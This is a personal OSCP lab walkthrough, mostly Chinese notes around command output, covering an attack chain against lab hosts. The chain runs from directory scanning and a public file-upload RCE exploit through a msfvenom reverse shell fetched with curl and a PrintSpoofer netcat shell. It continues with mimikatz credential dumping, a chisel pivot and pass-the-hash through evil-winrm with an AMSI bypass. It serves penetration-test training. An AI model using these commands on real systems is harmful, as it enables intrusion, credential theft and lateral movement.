Output File: /home/ouyang/.dirsearch/reports/192.168.240.141-81/-_23-07-30_19-34-45.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-07-30_19-34-45.log

Target: http://192.168.240.141:81/

[19:34:45] Starting:
[19:34:51] 403 -  290B  - /%3f/
[19:34:51] 403 -  290B  - /%C0%AE%C0%AE%C0%AF
[19:34:53] 403 -  290B  - /%ff
[19:35:00] 403 -  290B  - /.htaccess.bak1
[19:35:00] 403 -  290B  - /.htaccess_extra
[19:35:00] 403 -  290B  - /.ht_wsr.txt
[19:35:00] 403 -  290B  - /.htaccess.save
[19:35:00] 403 -  290B  - /.htaccess.orig
[19:35:00] 403 -  290B  - /.htaccess.sample
[19:35:00] 403 -  290B  - /.htaccess_orig
[19:35:00] 403 -  290B  - /.htaccess_sc
[19:35:00] 403 -  290B  - /.htaccessBAK
[19:35:01] 403 -  290B  - /.htaccessOLD
[19:35:01] 403 -  290B  - /.htaccessOLD2
[19:35:01] 403 -  290B  - /.htm
[19:35:01] 403 -  290B  - /.htpasswd_test
[19:35:01] 403 -  290B  - /.html
[19:35:01] 403 -  290B  - /.httr-oauth
[19:35:01] 403 -  290B  - /.htpasswds
[19:35:13] 301 -  331B  - /ADMIN  ->  http://192.168.240.141:81/ADMIN/
[19:35:14] 301 -  331B  - /Admin  ->  http://192.168.240.141:81/Admin/
[19:35:14] 302 -    0B  - /Admin/login/  ->  index.php
[19:35:15] 301 -  331B  - /Build  ->  http://192.168.240.141:81/Build/
[19:35:16] 301 -  328B  - /DB  ->  http://192.168.240.141:81/DB/
[19:35:23] 403 -  290B  - /Trace.axd::$DATA
[19:35:38] 200 -    8KB - /admin%20/
[19:35:38] 301 -  331B  - /admin  ->  http://192.168.240.141:81/admin/
[19:35:40] 301 -  332B  - /admin.  ->  http://192.168.240.141:81/admin./
[19:35:40] 200 -    8KB - /admin/
[19:35:40] 200 -    8KB - /admin/?/login
[19:35:40] 403 -  290B  - /admin/.htaccess
[19:35:43] 200 -    8KB - /admin/index.php
[19:35:43] 200 -    8KB - /admin/index
[19:35:43] 302 -    0B  - /admin/login  ->  index.php
[19:35:43] 302 -   43KB - /admin/home.php  ->  index.php
[19:35:43] 302 -   43KB - /admin/home  ->  index.php
[19:35:43] 302 -    0B  - /admin/login.php  ->  index.php
[19:36:12] 403 -  290B  - /adminer/adminer.php
[19:36:12] 403 -  290B  - /adminer/
[19:36:35] 301 -  342B  - /bower_components  ->  http://192.168.240.141:81/bower_components/
[19:36:36] 200 -    7KB - /bower_components/
[19:36:36] 301 -  331B  - /build  ->  http://192.168.240.141:81/build/
[19:36:36] 200 -    2KB - /build/
[19:36:38] 403 -  290B  - /cgi-bin/
[19:36:38] 500 -  633B  - /cgi-bin/printenv.pl
[19:36:52] 301 -  328B  - /db  ->  http://192.168.240.141:81/db/
[19:36:53] 200 -  969B  - /db/
[19:36:56] 301 -  330B  - /dist  ->  http://192.168.240.141:81/dist/
[19:36:56] 200 -    1KB - /dist/
[19:37:11] 200 -    1KB - /header.php
[19:37:11] 200 -    1KB - /header
[19:37:14] 301 -  332B  - /images  ->  http://192.168.240.141:81/images/
[19:37:14] 200 -    1KB - /images/
[19:37:16] 200 -    4KB - /index
[19:37:16] 200 -    4KB - /index.php
[19:37:16] 200 -    4KB - /index.php.
[19:37:16] 200 -    4KB - /index.php/login/
[19:37:16] 403 -  290B  - /index.php::$DATA
[19:37:16] 200 -    4KB - /index.pHp
[19:37:48] 403 -  290B  - /phpmyadmin/ChangeLog
[19:37:48] 403 -  290B  - /phpmyadmin/docs/html/index.html
[19:37:48] 403 -  290B  - /phpmyadmin/README
[19:37:48] 403 -  290B  - /phpmyadmin/doc/html/index.html
[19:37:50] 403 -  290B  - /phpmyadmin
[19:37:53] 403 -  290B  - /phpmyadmin/
[19:37:53] 403 -  290B  - /phpmyadmin/phpmyadmin/index.php
[19:37:53] 403 -  290B  - /phpmyadmin/scripts/setup.php
[19:37:53] 403 -  290B  - /phpmyadmin/index.php
[19:37:53] 403 -  290B  - /phpsysinfo/
[19:37:54] 200 -    2KB - /plugins/
[19:37:54] 301 -  333B  - /plugins  ->  http://192.168.240.141:81/plugins/
[19:38:05] 200 -  269B  - /scripts/iisadmin/ism.dll?http/dir
[19:38:05] 200 -  269B  - /scripts/no-such-file.pl
[19:38:05] 200 -  269B  - /scripts/root.exe?/c+dir
[19:38:05] 200 -  269B  - /scripts/samples/
[19:38:05] 200 -  269B  - /scripts/samples/search/webhits.exe
[19:38:05] 200 -  269B  - /scripts/setup.php
[19:38:05] 200 -  269B  - /scripts/tiny_mce
[19:38:05] 200 -  269B  - /scripts/ckeditor/ckfinder/core/connector/asp/connector.asp
[19:38:05] 200 -  269B  - /scripts
[19:38:05] 200 -  269B  - /scripts/ckeditor/ckfinder/core/connector/php/connector.php
[19:38:05] 200 -  269B  - /scripts/convert.bas
[19:38:05] 200 -  269B  - /scripts/ckeditor/ckfinder/core/connector/aspx/connector.aspx
[19:38:05] 200 -  269B  - /scripts/fpcount.exe
[19:38:05] 200 -  269B  - /scripts/cgimail.exe
[19:38:05] 200 -  269B  - /scripts/counter.exe
[19:38:05] 200 -  269B  - /scripts/tools/newdsn.exe
[19:38:05] 200 -  269B  - /scripts/
[19:38:05] 200 -  269B  - /scripts/tools/getdrvs.exe
[19:38:05] 200 -  269B  - /scripts/tinymce
[19:38:32] 403 -  290B  - /web.config::$DATA

Task Completed
```

發現 http://192.168.240.141:81/db/ 底下有個 apsystem.sql 檔案，裡面具有 nurhodelta 密碼
```json
INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
(1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
```

	重連 VPN，IP 改為 192.168.220.xxx & 10.10.110.xxx

透過 searchsploit 找 attendance and payroll system vulnerability
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ searchsploit "attendance and payroll"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Attendance and Payroll System v1.0 - Remote Code Execution (RCE)                           | php/webapps/50801.py
Attendance and Payroll System v1.0 - SQLi Authentication Bypass                            | php/webapps/50802.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

發現有一個 RCE & SQLi 弱點，嘗試利用 RCE 弱點，先修改利用路徑
```json
upload_path = '/admin/employee_edit_photo.php'
shell_path = '/images/shell.php'
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ python3 50801.py http://192.168.220.141:81/

    >> Attendance and Payroll System v1.0
    >> Unauthenticated Remote Code Execution
    >> By pr0z

[*] Uploading the web shell to http://192.168.220.141:81/
[*] Validating the shell has been uploaded to http://192.168.220.141:81/
[✓] Successfully connected to web shell

RCE > ls

RCE > dir
 Volume in drive C has no label.
 Volume Serial Number is 3C99-887F

 Directory of C:\wamp64\attendance\images

07/31/2023  08:14 AM    <DIR>          .
07/31/2023  08:14 AM    <DIR>          ..
04/01/2022  05:46 AM           351,474 desktop.jpg
04/01/2022  05:46 AM             4,240 facebook-profile-image.jpeg
04/01/2022  05:46 AM            26,644 profile.jpg
07/31/2023  08:14 AM                78 shell.php
               4 File(s)        382,436 bytes
               2 Dir(s)  11,140,788,224 bytes free

RCE >
```

get shell!

接著上傳 reverse shell 上去
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.232 LPORT=4444 -f exe -o reverse_shell.exe
```

在靶機上透過 curl 下載
```bash
curl http://192.168.45.232:8000/reverse_shell.exe --output reverse_shell.exe
.\reverse_shell.exe
```

kali:
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.232] from (UNKNOWN) [192.168.220.141] 54327
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\wamp64\attendance\images>
```

```json
C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.220.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.220.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.110.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

### 141 提權

```json
C:\Users>systeminfo
systeminfo

Host Name:                 MS01
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19044 N/A Build 19044
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec
Registered Organization:
Product ID:                00331-10000-00001-AA247
Original Install Date:     3/25/2022, 6:55:24 AM
System Boot Time:          7/11/2023, 8:22:18 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,511 MB
Virtual Memory: Max Size:  7,039 MB
Virtual Memory: Available: 2,482 MB
Virtual Memory: In Use:    4,557 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    oscp.exam
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB5013624
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB5003791
                           [08]: KB5019959
                           [09]: KB5011352
                           [10]: KB5018506
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.220.141
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.110.141
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

一樣先執行 winPEASx64.exe
```json
����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
```

發現其有 SeImpersonatePrivilege 權限，且是 Win10，滿足 PrintSpoofer 使用條件
使用 PrintSpoofer 來提權 (須先上傳 nc.exe 至靶機)
靶機：
```json
C:\Users\Mary.Williams\Desktop>.\PrintSpoofer64.exe -c ".\nc.exe 192.168.45.232 5555 -e cmd"
.\PrintSpoofer64.exe -c ".\nc.exe 192.168.45.232 5555 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

kali：
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.45.232] from (UNKNOWN) [192.168.220.141] 54550
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

成功提權！

開始 dump credential，上傳 mimikatz 並執行
```json
C:\Users\Administrator\Desktop>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # PRIVILEGE::Debug
Privilege '20' OK

mimikatz # SEKURLSA::LogonPasswords

Authentication Id : 0 ; 413017 (00000000:00064d59)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 7/11/2023 8:22:52 AM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
	msv :
	 [00000003] Primary
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
	 * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
	 * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
	tspkg :
	wdigest :
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : celia.almeda
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :
	credman :
	cloudap :

...
```

同時用 net user 確認 dump 出 ntlm 的 account，確認是 domain user，可被利用來橫向
```json
C:\Users\Administrator\Desktop>net user celia.almeda /domain
net user celia.almeda /domain
The request will be processed at a domain controller for domain oscp.exam.

User name                    celia.almeda
Full Name                    Celia Almeda
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/1/2022 9:25:03 AM
Password expires             Never
Password changeable          4/2/2022 9:25:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/31/2023 8:05:00 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

	重連 VPN，IP 改為 192.168.215.xxx & 10.10.105.xxx

接著開始嘗試橫向，發現 141 具有內網 ip，先上傳 chisel.exe 到靶機

kali: 
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ chisel server -p 8081 --reverse
2023/08/01 22:18:08 server: Reverse tunnelling enabled
2023/08/01 22:18:08 server: Fingerprint QaUg1Wu7NW/JpB41LFbH0tQlTGb4klAwrOjTH1UlTnI=
2023/08/01 22:18:08 server: Listening on http://0.0.0.0:8081
```

141:
```json
C:\Users\Administrator\Desktop>.\chisel.exe client 192.168.45.239:8081 R:socks
.\chisel.exe client 192.168.45.239:8081 R:socks
```

kali:
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ chisel server -p 8081 --reverse
2023/08/01 22:18:08 server: Reverse tunnelling enabled
2023/08/01 22:18:08 server: Fingerprint QaUg1Wu7NW/JpB41LFbH0tQlTGb4klAwrOjTH1UlTnI=
2023/08/01 22:18:08 server: Listening on http://0.0.0.0:8081
2023/08/01 22:19:07 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

*記得 /etc/proxychains4.conf 要設定一行*
```bash
socks5 127.0.0.1 1080
```

嘗試使用 proxychains 執行指令，確認可連到內網
```json
┌──(ouyang㉿kali)-[~/tools/chisel]
└─$ proxychains -q nmap 10.10.105.142 -p 135
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-01 22:27 CST
Nmap scan report for 10.10.105.142
Host is up (2.8s latency).

PORT    STATE SERVICE
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 4.13 seconds
```

## 142

嘗試 pass the hash 到 142 但失敗，沒有 ADMIN$ & C$ 寫入權限
```json
┌──(ouyang㉿kali)-[~/tools/windows/mimikatz/x64]
└─$ proxychains -q impacket-psexec -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.105.142
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.105.142.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

發現 port 5985 有開，嘗試使用 winRM 攻擊
透過 evil-winrm 嘗試連限制 142
```json
┌──(ouyang㉿kali)-[~/tools/windows/mimikatz/x64]
└─$ proxychains -q evil-winrm -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -i 10.10.105.142

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\celia.almeda\Documents>
```
成功！

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ proxychains -q evil-winrm -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -i 10.10.105.142 -e .

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\celia.almeda\Documents> Bypass-4MSI

Warning: AV could be still watching for suspicious activity. Waiting for patching...

Info: Patching 4MSI, please be patient...

[+] Success!

*Evil-WinRM* PS C:\Users\celia.almeda\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

#### winPEAS.exe

```json
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> upload winPEASx64.exe
Info: Uploading winPEASx64.exe to C:\Users\celia.almeda\Documents\winPEASx64.exe


Data: 2704724 bytes of 2704724 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\celia.almeda\Documents> winPEASx64.exe
The term 'winPEASx64.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ winPEASx64.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (winPEASx64.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> .\winPEASx64.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------|
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |
       |         Follow on Twitter         :     @hacktricks_live                           |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Checks.Checks.CreateDynamicLists()
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
Error while creating directory list: System.IO.FileNotFoundException: Could not load file or assembly 'AlphaFS, Version=2.2.0.0, Culture=neutral, PublicKeyToken=4d31a58f7d7ad5c9' or one of its dependencies. The system cannot find the file specified.
File name: 'AlphaFS, Version=2.2.0.0, Culture=neutral, PublicKeyToken=4d31a58f7d7ad5c9'
   at winPEAS.Helpers.Search.SearchHelper.GetFilesFast(String folder, String pattern, HashSet`1 excludedDirs, Boolean isFoldersIncluded)
   at winPEAS.Helpers.Search.SearchHelper.CreateSearchDirectoriesList()
   at winPEAS.Checks.Checks.CreateDynamicLists()

WRN: Assembly binding logging is turned OFF.
To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.
Note: There is some performance penalty associated with assembly bind failure logging.
To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
winPEASx64.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
  [X] Exception: Access denied
  [X] Exception: Access denied
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    3/2/2023 1:37:07 AM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables
    COMPUTERNAME: MS02
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\celia.almeda\AppData\Local
    PSModulePath: C:\Users\celia.almeda\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Azure Data Studio\bin;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\;C:\Users\celia.almeda\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 25
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\celia.almeda
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 0101
    USERNAME: celia.almeda
    CommonProgramW6432: C:\Program Files\Common Files
    OneDrive: C:\Users\celia.almeda\OneDrive
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\CELIA~1.ALM\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\celia.almeda\AppData\Roaming
    TMP: C:\Users\CELIA~1.ALM\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: OSCP
    USERDNSDOMAIN: oscp.exam

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Azure Data Studio\bin;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced
  [X] Exception: Could not load file or assembly 'AlphaFS, Version=2.2.0.0, Culture=neutral, PublicKeyToken=4d31a58f7d7ad5c9' or one of its dependencies. The system cannot find the file specified.

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard
